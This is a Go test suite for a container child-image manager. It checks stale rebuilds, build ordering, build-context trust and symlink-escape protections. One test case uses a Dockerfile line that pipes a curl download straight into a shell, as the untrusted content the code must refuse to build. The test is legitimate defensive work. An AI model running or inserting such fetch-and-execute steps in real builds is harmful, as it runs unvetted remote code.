package container

import (
	"context"
	"errors"
	"io/fs"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/mock"
	"github.com/stretchr/testify/require"
	"github.com/stretchr/testify/suite"

	"github.com/radutopala/loop/internal/buildctx"
	"github.com/radutopala/loop/internal/osutil"
)

type ChildImagesSuite struct {
	suite.Suite
	client *MockDockerClient
	files  map[string][]byte
	// events records build marks, handoffs and file writes, in order.
	events []string
	// writeErr fails the manager's file writes.
	writeErr error
	// distrust makes the owner trust no build context, distrustDir none of
	// that project's; trustErr and keepErr fail TrustedBuild and KeepBuild.
	distrust          bool
	distrustDir       string
	trustErr, keepErr error
}

func TestChildImagesSuite(t *testing.T) {
	suite.Run(t, new(ChildImagesSuite))
}

func (s *ChildImagesSuite) SetupTest() {
	s.client = new(MockDockerClient)
	s.files = map[string][]byte{}
	s.events = nil
	s.writeErr = nil
	s.distrust, s.distrustDir = false, ""
	s.trustErr, s.keepErr = nil, nil
}

// contextFiles fingerprints the in-memory build context in contextDir.
func (s *ChildImagesSuite) contextFiles(contextDir string) buildctx.Files {
	return buildctx.Files{"Dockerfile": buildctx.FileDigest(s.files[contextDir+"/Dockerfile"], defaultDockerfileMode)}
}

// TrustedBuild trusts each project's current build context, unless
// distrusted.
func (s *ChildImagesSuite) TrustedBuild(dir string) (buildctx.Files, error) {
	if s.trustErr != nil || s.distrust || dir == s.distrustDir {
		return nil, s.trustErr
	}
	return s.contextFiles(dir + "/.loop/container"), nil
}

// KeepBuild records the keep in events.
func (s *ChildImagesSuite) KeepBuild(dir, rel string, _ []byte, mode fs.FileMode) error {
	s.events = append(s.events, "keep "+dir+" "+rel+" "+mode.String())
	return s.keepErr
}

// handoff is the RebuildStale handoff, recorded in events.
func (s *ChildImagesSuite) handoff() { s.events = append(s.events, "handoff") }

// beginBuild is the manager's build marker, recorded in events.
func (s *ChildImagesSuite) beginBuild(images ...string) func() {
	s.events = append(s.events, "begin "+strings.Join(images, ","))
	return func() { s.events = append(s.events, "end "+strings.Join(images, ",")) }
}

// newMgr builds a manager over the mock client with an in-memory filesystem
// and a static project list.
func (s *ChildImagesSuite) newMgr(projects []ChildProject, listErr error) *ChildImageManager {
	m := NewChildImageManager(s.client, "loop-agent:latest", func(context.Context) ([]ChildProject, error) {
		return projects, listErr
	}, s.beginBuild, slog.Default())
	m.readFile = func(path string) ([]byte, error) {
		if b, ok := s.files[path]; ok {
			return b, nil
		}
		return nil, fs.ErrNotExist
	}
	m.writeFile = func(_, path string, data []byte) error {
		if s.writeErr != nil {
			return s.writeErr
		}
		s.files[path] = data
		s.events = append(s.events, "write "+path)
		return nil
	}
	// Builds from the context itself, which then needs no cleanup.
	m.snapshot = func(_, contextDir string) (string, buildctx.Files, func(), error) {
		return contextDir, s.contextFiles(contextDir), func() {}, nil
	}
	m.SetBuildTrust(s)
	return m
}

func dfPath(dir string) string { return dir + "/.loop/container/Dockerfile" }

func (s *ChildImagesSuite) TestRebuildsStaleChild() {
	s.files[dfPath("/proj")] = []byte("FROM loop-agent:latest\nRUN true\n")
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:parent1"}, nil)
	// child labeled with an OLD parent id → stale → rebuild with new label
	s.client.On("ImageInspectLabels", mock.Anything, "proj-agent:latest").
		Return(map[string]string{ParentIDLabel: "sha256:old"}, nil)
	s.client.On("ImageBuildFileLabels", mock.Anything, "/proj/.loop/container", "Dockerfile", "proj-agent:latest",
		map[string]string{ParentIDLabel: "sha256:parent1"}).Return(nil)

	m := s.newMgr([]ChildProject{{DirPath: "/proj", Image: "proj-agent:latest", Autobuild: true}}, nil)
	m.RebuildStale(context.Background(), s.handoff)
	s.client.AssertExpectations(s.T())
}

func (s *ChildImagesSuite) TestSkipsFreshChild() {
	s.files[dfPath("/proj")] = []byte("FROM loop-agent:latest\n")
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:parent1"}, nil)
	s.client.On("ImageInspectLabels", mock.Anything, "proj-agent:latest").
		Return(map[string]string{ParentIDLabel: "sha256:parent1"}, nil)

	m := s.newMgr([]ChildProject{{DirPath: "/proj", Image: "proj-agent:latest", Autobuild: true}}, nil)
	m.RebuildStale(context.Background(), s.handoff)
	s.client.AssertNotCalled(s.T(), "ImageBuildFileLabels", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything)
}

func (s *ChildImagesSuite) TestSkipsChildBuiltMeanwhile() {
	s.files[dfPath("/proj")] = []byte("FROM loop-agent:latest\n")
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:parent1"}, nil)
	// Stale when the cascade looks, built on the new base (by a run's
	// BuildMissing) by the time its turn comes.
	s.client.On("ImageInspectLabels", mock.Anything, "proj-agent:latest").
		Return(map[string]string{ParentIDLabel: "sha256:old"}, nil).Once()
	s.client.On("ImageInspectLabels", mock.Anything, "proj-agent:latest").
		Return(map[string]string{ParentIDLabel: "sha256:parent1"}, nil).Once()

	m := s.newMgr([]ChildProject{{DirPath: "/proj", Image: "proj-agent:latest", Autobuild: true}}, nil)
	m.RebuildStale(context.Background(), s.handoff)
	s.client.AssertNotCalled(s.T(), "ImageBuildFileLabels", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything)
	require.Equal(s.T(), []string{"begin proj-agent:latest", "handoff", "end proj-agent:latest"}, s.events)
}

func (s *ChildImagesSuite) TestCascadeHoldsOnlyTheImageItBuilds() {
	s.files[dfPath("/slow")] = []byte("FROM loop-agent:latest\n")
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:parent1"}, nil)
	s.client.On("ImageInspectLabels", mock.Anything, "slow-agent:latest").Return(nil, errors.New("no such image"))
	building := make(chan struct{})
	release := make(chan struct{})
	s.client.On("ImageBuildFileLabels", mock.Anything, "/slow/.loop/container", "Dockerfile", "slow-agent:latest",
		map[string]string{ParentIDLabel: "sha256:parent1"}).
		Run(func(mock.Arguments) {
			close(building)
			<-release
		}).Return(nil)
	s.client.On("ImageList", mock.Anything, "proj-agent:latest").Return([]string{"sha256:c"}, nil)

	m := s.newMgr([]ChildProject{{DirPath: "/slow", Image: "slow-agent:latest", Autobuild: true}}, nil)
	done := make(chan struct{})
	go func() {
		m.RebuildStale(context.Background(), func() {})
		close(done)
	}()
	<-building

	// A run on another project's image goes on while the cascade builds.
	require.NoError(s.T(), m.BuildMissing(context.Background(), "proj-agent:latest", true, []string{"/proj"}, func() {
		s.Fail("proj-agent:latest exists; nothing to build")
	}))
	close(release)
	<-done
	s.client.AssertExpectations(s.T())
}

func (s *ChildImagesSuite) TestRebuildsUnlabeledChild() {
	// Pre-feature child images have no parent label → treated as stale once.
	s.files[dfPath("/proj")] = []byte("FROM loop-agent\n")
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:p"}, nil)
	s.client.On("ImageInspectLabels", mock.Anything, "proj-agent:latest").
		Return(map[string]string{}, nil)
	s.client.On("ImageBuildFileLabels", mock.Anything, "/proj/.loop/container", "Dockerfile", "proj-agent:latest",
		map[string]string{ParentIDLabel: "sha256:p"}).Return(nil)

	m := s.newMgr([]ChildProject{{DirPath: "/proj", Image: "proj-agent:latest", Autobuild: true}}, nil)
	m.RebuildStale(context.Background(), s.handoff)
	s.client.AssertExpectations(s.T())
}

func (s *ChildImagesSuite) TestInspectErrorTreatedAsStale() {
	// A child image that doesn't exist yet inspects with an error → build it.
	s.files[dfPath("/proj")] = []byte("FROM loop-agent:latest\n")
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:p"}, nil)
	s.client.On("ImageInspectLabels", mock.Anything, "proj-agent:latest").
		Return(map[string]string(nil), errors.New("no such image"))
	s.client.On("ImageBuildFileLabels", mock.Anything, "/proj/.loop/container", "Dockerfile", "proj-agent:latest",
		map[string]string{ParentIDLabel: "sha256:p"}).Return(nil)

	m := s.newMgr([]ChildProject{{DirPath: "/proj", Image: "proj-agent:latest", Autobuild: true}}, nil)
	m.RebuildStale(context.Background(), s.handoff)
	s.client.AssertExpectations(s.T())
}

func (s *ChildImagesSuite) TestBuildErrorContinuesToNextChild() {
	s.files[dfPath("/a")] = []byte("FROM loop-agent:latest\n")
	s.files[dfPath("/b")] = []byte("FROM loop-agent:latest\n")
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:p"}, nil)
	s.client.On("ImageInspectLabels", mock.Anything, mock.Anything).Return(map[string]string{}, nil)
	s.client.On("ImageBuildFileLabels", mock.Anything, "/a/.loop/container", "Dockerfile", "a-agent:latest", mock.Anything).
		Return(errors.New("build boom"))
	s.client.On("ImageBuildFileLabels", mock.Anything, "/b/.loop/container", "Dockerfile", "b-agent:latest", mock.Anything).
		Return(nil)

	m := s.newMgr([]ChildProject{
		{DirPath: "/a", Image: "a-agent:latest", Autobuild: true},
		{DirPath: "/b", Image: "b-agent:latest", Autobuild: true},
	}, nil)
	m.RebuildStale(context.Background(), s.handoff)
	s.client.AssertExpectations(s.T())
	// Every stale child is marked before the base build hands over, and each
	// is released as soon as its own build is done, failed or not.
	require.Equal(s.T(), []string{
		"begin a-agent:latest", "begin b-agent:latest", "handoff",
		"end a-agent:latest", "end b-agent:latest",
	}, s.events)
}

// The base build must not hand over before the child is marked, or a run
// could start on the old project image in between; the mark lasts until the
// child's build is done.
func (s *ChildImagesSuite) TestMarksChildBeforeHandoffUntilBuilt() {
	s.files[dfPath("/proj")] = []byte("FROM loop-agent:latest\n")
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:p"}, nil)
	s.client.On("ImageInspectLabels", mock.Anything, "proj-agent:latest").Return(map[string]string{}, nil)
	s.client.On("ImageBuildFileLabels", mock.Anything, "/proj/.loop/container", "Dockerfile", "proj-agent:latest", mock.Anything).
		Run(func(mock.Arguments) { s.events = append(s.events, "build proj-agent:latest") }).
		Return(nil)

	m := s.newMgr([]ChildProject{{DirPath: "/proj", Image: "proj-agent:latest", Autobuild: true}}, nil)
	m.RebuildStale(context.Background(), s.handoff)
	require.Equal(s.T(), []string{
		"begin proj-agent:latest", "handoff", "build proj-agent:latest", "end proj-agent:latest",
	}, s.events)
}

// However the cascade ends early, the base build is handed over exactly once.
func (s *ChildImagesSuite) TestHandoffWhenNothingToRebuild() {
	tests := []struct {
		name  string
		setup func(m *ChildImageManager)
	}{
		{name: "no base image name", setup: func(m *ChildImageManager) { m.baseImage = "" }},
		{name: "base image missing", setup: func(*ChildImageManager) {
			s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{}, nil)
		}},
		{name: "listing projects fails", setup: func(m *ChildImageManager) {
			s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:p"}, nil)
			m.listProjects = func(context.Context) ([]ChildProject, error) { return nil, errors.New("db down") }
		}},
		{name: "no stale child", setup: func(*ChildImageManager) {
			s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:p"}, nil)
		}},
	}
	for _, tc := range tests {
		s.Run(tc.name, func() {
			s.SetupTest()
			m := s.newMgr(nil, nil)
			tc.setup(m)
			m.RebuildStale(context.Background(), s.handoff)
			require.Equal(s.T(), []string{"handoff"}, s.events)
		})
	}
}

func (s *ChildImagesSuite) TestSkipsIneligibleProjects() {
	// no override / same-as-base / autobuild off / duplicate image / no
	// Dockerfile / Dockerfile from another base — none may trigger a build.
	s.files[dfPath("/foreign")] = []byte("FROM ubuntu:24.04\n")
	s.files[dfPath("/dup")] = []byte("FROM loop-agent:latest\n")
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:p"}, nil)
	s.client.On("ImageInspectLabels", mock.Anything, "dup-agent:latest").
		Return(map[string]string{ParentIDLabel: "sha256:p"}, nil)

	m := s.newMgr([]ChildProject{
		{DirPath: "/none", Image: "", Autobuild: true},
		{DirPath: "/base", Image: "loop-agent:latest", Autobuild: true},
		{DirPath: "/optout", Image: "opt-agent:latest", Autobuild: false},
		{DirPath: "/dup", Image: "dup-agent:latest", Autobuild: true},
		{DirPath: "/dup2", Image: "dup-agent:latest", Autobuild: true},
		{DirPath: "/nodf", Image: "nodf-agent:latest", Autobuild: true},
		{DirPath: "/foreign", Image: "foreign-agent:latest", Autobuild: true},
	}, nil)
	m.RebuildStale(context.Background(), s.handoff)
	s.client.AssertNotCalled(s.T(), "ImageBuildFileLabels", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything)
}

func (s *ChildImagesSuite) TestNoBaseImageSkipsCascade() {
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{}, nil)
	m := s.newMgr([]ChildProject{{DirPath: "/proj", Image: "x:latest", Autobuild: true}}, nil)
	m.RebuildStale(context.Background(), s.handoff)
	s.client.AssertNotCalled(s.T(), "ImageInspectLabels", mock.Anything, mock.Anything)
}

func (s *ChildImagesSuite) TestBaseImageListErrorSkipsCascade() {
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string(nil), errors.New("docker down"))
	m := s.newMgr(nil, nil)
	m.RebuildStale(context.Background(), s.handoff)
}

func (s *ChildImagesSuite) TestListProjectsErrorSkipsCascade() {
	s.client.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:p"}, nil)
	m := s.newMgr(nil, errors.New("db down"))
	m.RebuildStale(context.Background(), s.handoff)
	s.client.AssertNotCalled(s.T(), "ImageInspectLabels", mock.Anything, mock.Anything)
}

func (s *ChildImagesSuite) TestNewManagerDefaultsReadFile() {
	m := NewChildImageManager(s.client, "loop-agent:latest", nil, nil, slog.Default())
	require.NotNil(s.T(), m.readFile)
	_, err := m.readFile("/definitely/not/a/file")
	require.Error(s.T(), err)
}

func TestDockerfileFromBase(t *testing.T) {
	cases := []struct {
		name    string
		content string
		want    bool
	}{
		{"plain match", "FROM loop-agent:latest\n", true},
		{"untagged match", "FROM loop-agent\n", true},
		{"alias stage", "FROM loop-agent:latest AS base\nFROM scratch\n", true},
		{"platform flag", "FROM --platform=linux/amd64 loop-agent:latest\n", true},
		{"case insensitive", "from loop-agent:latest\n", true},
		{"later stage", "FROM golang:1.26 AS build\nFROM loop-agent:latest\n", true},
		{"other base", "FROM ubuntu:24.04\n", false},
		{"other tag", "FROM loop-agent:v1\n", false},
		{"comment only", "# FROM loop-agent:latest is not an instruction? it is a comment line\n", false},
		{"empty", "", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			require.Equal(t, tc.want, dockerfileFromBase(tc.content, "loop-agent:latest"))
		})
	}
}

func (s *ChildImagesSuite) TestEmptyBaseImageNoop() {
	m := s.newMgr(nil, nil)
	m.baseImage = ""
	m.RebuildStale(context.Background(), s.handoff)
	s.client.AssertNotCalled(s.T(), "ImageList", mock.Anything, mock.Anything)
}

func (s *ChildImagesSuite) TestBuildMissing() {
	const image = "proj-agent:latest"
	labels := map[string]string{ParentIDLabel: "sha256:p"}
	missing := func(c *MockDockerClient) {
		c.On("ImageList", mock.Anything, image).Return([]string{}, nil)
		c.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{"sha256:p"}, nil)
	}
	builds := func(contextDir string, err error) func(c *MockDockerClient) {
		return func(c *MockDockerClient) {
			missing(c)
			c.On("ImageBuildFileLabels", mock.Anything, contextDir, "Dockerfile", image, labels).Return(err)
		}
	}
	tests := []struct {
		name        string
		image       string
		autobuild   bool
		dirs        []string
		files       map[string]string
		readErr     error
		writeErr    error
		keepErr     error
		distrust    bool
		distrustDir string
		setup       func(c *MockDockerClient)
		wantErr     string
		wantEvents  []string
		wantFiles   map[string]string
	}{
		{name: "no image override", image: "", autobuild: true},
		{name: "the base image itself", image: "loop-agent", autobuild: true},
		{name: "autobuild off", image: image},
		{
			name: "image exists", image: image, autobuild: true,
			setup: func(c *MockDockerClient) {
				c.On("ImageList", mock.Anything, image).Return([]string{"sha256:c"}, nil)
			},
		},
		{
			name: "image list fails", image: image, autobuild: true,
			setup: func(c *MockDockerClient) {
				c.On("ImageList", mock.Anything, image).Return([]string(nil), errors.New("daemon down"))
			},
		},
		{
			name: "base image missing", image: image, autobuild: true, dirs: []string{"/proj"},
			setup: func(c *MockDockerClient) {
				c.On("ImageList", mock.Anything, image).Return([]string{}, nil)
				c.On("ImageList", mock.Anything, "loop-agent:latest").Return([]string{}, nil)
			},
		},
		{name: "no dirs", image: image, autobuild: true, dirs: []string{""}, setup: missing},
		{
			name: "Dockerfile not FROM the base", image: image, autobuild: true, dirs: []string{"/proj"},
			files: map[string]string{"/proj": "FROM alpine\n"},
			setup: missing,
		},
		{
			name: "worktree Dockerfile not FROM the base, none in the project", image: image, autobuild: true,
			dirs:  []string{"/proj/wt", "/proj"},
			files: map[string]string{"/proj/wt": "FROM alpine\n"},
			setup: missing,
		},
		{
			name: "Dockerfile unreadable", image: image, autobuild: true, dirs: []string{"/proj"},
			readErr: fs.ErrPermission, setup: missing,
		},
		{
			name: "builds from the worktree's parent", image: image, autobuild: true, dirs: []string{"/proj/wt", "/proj"},
			files:      map[string]string{"/proj": "FROM loop-agent:latest\n"},
			setup:      builds("/proj/.loop/container", nil),
			wantEvents: []string{"build", "begin " + image, "end " + image},
		},
		{
			name: "writes a Dockerfile into the project", image: image, autobuild: true, dirs: []string{"/proj/wt", "/proj"},
			setup:      builds("/proj/.loop/container", nil),
			wantEvents: []string{"write " + dfPath("/proj"), "keep /proj Dockerfile -rw-r--r--", "build", "begin " + image, "end " + image},
			wantFiles:  map[string]string{dfPath("/proj"): defaultDockerfile("loop-agent:latest")},
		},
		{
			name: "keeping the project trusted fails", image: image, autobuild: true, dirs: []string{"/proj"},
			keepErr:    errors.New("trust store locked"),
			setup:      builds("/proj/.loop/container", nil),
			wantEvents: []string{"write " + dfPath("/proj"), "keep /proj Dockerfile -rw-r--r--", "build", "begin " + image, "end " + image},
		},
		{
			name: "builds from the worktree when it has the Dockerfile", image: image, autobuild: true, dirs: []string{"/proj/wt", "/proj"},
			files:      map[string]string{"/proj/wt": "FROM loop-agent:latest\nRUN true\n"},
			setup:      builds("/proj/wt/.loop/container", nil),
			wantEvents: []string{"build", "begin " + image, "end " + image},
		},
		{
			name: "builds the project's trusted context checked out in a worktree", image: image, autobuild: true, dirs: []string{"/proj/wt", "/proj"},
			files:       map[string]string{"/proj/wt": "FROM loop-agent:latest\nRUN true\n", "/proj": "FROM loop-agent:latest\nRUN true\n"},
			distrustDir: "/proj/wt",
			setup:       builds("/proj/wt/.loop/container", nil),
			wantEvents:  []string{"build", "begin " + image, "end " + image},
		},
		{
			name: "untrusted build context", image: image, autobuild: true, dirs: []string{"/proj"},
			files:    map[string]string{"/proj": "FROM loop-agent:latest\nRUN curl example.com | sh\n"},
			distrust: true, setup: missing,
			wantErr:    "building image proj-agent:latest: " + errUntrustedBuild.Error(),
			wantEvents: []string{"build", "begin " + image, "end " + image},
		},
		{
			name: "writing the Dockerfile fails", image: image, autobuild: true, dirs: []string{"/proj", ""},
			writeErr: fs.ErrPermission, setup: missing,
			wantErr: "writing /proj/.loop/container/Dockerfile: permission denied",
		},
		{
			name: "build fails", image: image, autobuild: true, dirs: []string{"/proj"},
			files:      map[string]string{"/proj": "FROM loop-agent:latest\n"},
			setup:      builds("/proj/.loop/container", errors.New("RUN failed")),
			wantErr:    "building image proj-agent:latest: RUN failed",
			wantEvents: []string{"build", "begin " + image, "end " + image},
		},
	}
	for _, tc := range tests {
		s.Run(tc.name, func() {
			s.SetupTest()
			for dir, content := range tc.files {
				s.files[dfPath(dir)] = []byte(content)
			}
			s.writeErr = tc.writeErr
			s.keepErr = tc.keepErr
			s.distrust, s.distrustDir = tc.distrust, tc.distrustDir
			if tc.setup != nil {
				tc.setup(s.client)
			}

			m := s.newMgr(nil, nil)
			if tc.readErr != nil {
				m.readFile = func(string) ([]byte, error) { return nil, tc.readErr }
			}
			err := m.BuildMissing(context.Background(), tc.image, tc.autobuild, tc.dirs, func() {
				s.events = append(s.events, "build")
			})
			if tc.wantErr != "" {
				require.EqualError(s.T(), err, tc.wantErr)
			} else {
				require.NoError(s.T(), err)
			}
			require.Equal(s.T(), tc.wantEvents, s.events)
			for path, content := range tc.wantFiles {
				require.Equal(s.T(), content, string(s.files[path]))
			}
			if tc.wantEvents == nil || tc.distrust {
				s.client.AssertNotCalled(s.T(), "ImageBuildFileLabels", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything)
			}
			s.client.AssertExpectations(s.T())
		})
	}
}

func (s *ChildImagesSuite) TestDefaultDockerfileIsFromBase() {
	require.True(s.T(), dockerfileFromBase(defaultDockerfile("loop-agent:latest"), "loop-agent:latest"))
}

func TestWriteFileMkdir(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, ".loop", "container", "Dockerfile")
	require.NoError(t, writeFileMkdir(root, path, []byte("FROM loop-agent:latest\n")))
	got, err := os.ReadFile(path)
	require.NoError(t, err)
	require.Equal(t, "FROM loop-agent:latest\n", string(got))

	// The dir can't be created under a file.
	require.Error(t, writeFileMkdir(root, filepath.Join(path, "Dockerfile"), nil))

	// A Dockerfile that's a dangling symlink out of root isn't written
	// through, and neither is a container dir that leads out.
	host := t.TempDir()
	for _, link := range []struct{ at, to string }{
		{filepath.Join(root, "a", ".loop", "container", "Dockerfile"), filepath.Join(host, "Dockerfile")},
		{filepath.Join(root, "b", ".loop", "container"), host},
	} {
		require.NoError(t, os.MkdirAll(filepath.Dir(link.at), 0o755))
		require.NoError(t, os.Symlink(link.to, link.at))
	}
	for _, project := range []string{"a", "b"} {
		dir := filepath.Join(root, project)
		require.True(t, osutil.IsEscape(writeFileMkdir(dir, filepath.Join(dir, childDockerfileRelPath), nil)))
	}
	require.NoFileExists(t, filepath.Join(host, "Dockerfile"))
}

func (s *ChildImagesSuite) TestBuildMissingNoBase() {
	m := s.newMgr(nil, nil)
	m.baseImage = ""
	require.NoError(s.T(), m.BuildMissing(context.Background(), "proj-agent:latest", true, []string{"/proj"}, func() {}))
	s.client.AssertNotCalled(s.T(), "ImageList", mock.Anything, mock.Anything)
}

func (s *ChildImagesSuite) TestBuild() {
	const image, dir, contextDir = "proj-agent:latest", "/proj", "/proj/.loop/container"
	labels := map[string]string{ParentIDLabel: "sha256:p"}
	tests := []struct {
		name        string
		dockerfile  string
		noTrust     bool
		distrust    bool
		trustErr    error
		snapshotErr error
		builds      bool
		wantErr     string
	}{
		{name: "the trusted context", dockerfile: "FROM loop-agent:latest\nRUN true\n", builds: true},
		{name: "a context the owner didn't trust", dockerfile: "FROM loop-agent:latest\nRUN true\n", distrust: true, wantErr: errUntrustedBuild.Error()},
		{name: "no trust store", dockerfile: "FROM loop-agent:latest\nRUN true\n", noTrust: true, wantErr: errUntrustedBuild.Error()},
		{name: "Loop's default Dockerfile needs no trust", dockerfile: defaultDockerfile("loop-agent:latest"), distrust: true, builds: true},
		{name: "Loop's default Dockerfile without a trust store", dockerfile: defaultDockerfile("loop-agent:latest"), noTrust: true, builds: true},
		{name: "reading the trust fails", dockerfile: "FROM loop-agent:latest\n", trustErr: errors.New("bad trust file"), wantErr: "bad trust file"},
		{name: "copying the context fails", snapshotErr: fs.ErrPermission, wantErr: "copying the build context /proj/.loop/container: permission denied"},
	}
	for _, tc := range tests {
		s.Run(tc.name, func() {
			s.SetupTest()
			s.files[dfPath(dir)] = []byte(tc.dockerfile)
			s.distrust, s.trustErr = tc.distrust, tc.trustErr
			if tc.builds {
				s.client.On("ImageBuildFileLabels", mock.Anything, "/snap", "Dockerfile", image, labels).Return(nil)
			}
			m := s.newMgr(nil, nil)
			if tc.noTrust {
				m.SetBuildTrust(nil)
			}
			cleaned := false
			m.snapshot = func(root, c string) (string, buildctx.Files, func(), error) {
				require.Equal(s.T(), dir, root)
				require.Equal(s.T(), contextDir, c)
				if tc.snapshotErr != nil {
					return "", nil, nil, tc.snapshotErr
				}
				return "/snap", s.contextFiles(c), func() { cleaned = true }, nil
			}
			err := m.build(context.Background(), image, dir, contextDir, []string{dir}, labels)
			if tc.wantErr != "" {
				require.EqualError(s.T(), err, tc.wantErr)
			} else {
				require.NoError(s.T(), err)
			}
			require.Equal(s.T(), tc.snapshotErr == nil, cleaned)
			if !tc.builds {
				s.client.AssertNotCalled(s.T(), "ImageBuildFileLabels", mock.Anything, mock.Anything, mock.Anything, mock.Anything, mock.Anything)
			}
			s.client.AssertExpectations(s.T())
		})
	}
}

func TestSnapshotContext(t *testing.T) {
	dir := t.TempDir()
	contextDir := filepath.Join(dir, ".loop", "container")
	require.NoError(t, os.MkdirAll(contextDir, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(contextDir, "Dockerfile"), []byte("FROM loop-agent:latest\n"), 0o644))

	dst, files, cleanup, err := snapshotContext(dir, contextDir)
	require.NoError(t, err)
	require.Equal(t, buildctx.Files{"Dockerfile": buildctx.FileDigest([]byte("FROM loop-agent:latest\n"), 0o644)}, files)
	got, err := os.ReadFile(filepath.Join(dst, "Dockerfile"))
	require.NoError(t, err)
	require.Equal(t, "FROM loop-agent:latest\n", string(got))
	cleanup()
	require.NoDirExists(t, dst)

	// A context dir that leads out of the project isn't copied.
	other := t.TempDir()
	require.NoError(t, os.Symlink(contextDir, filepath.Join(other, "container")))
	_, _, _, err = snapshotContext(other, filepath.Join(other, "container"))
	require.True(t, osutil.IsEscape(err))

	// Nor is a missing one.
	_, _, _, err = snapshotContext(dir, filepath.Join(dir, "missing"))
	require.ErrorIs(t, err, fs.ErrNotExist)
}

func TestSnapshotContextNoTempDir(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("TMPDIR", filepath.Join(dir, "missing"))
	_, _, _, err := snapshotContext(dir, dir)
	require.ErrorIs(t, err, fs.ErrNotExist)
}
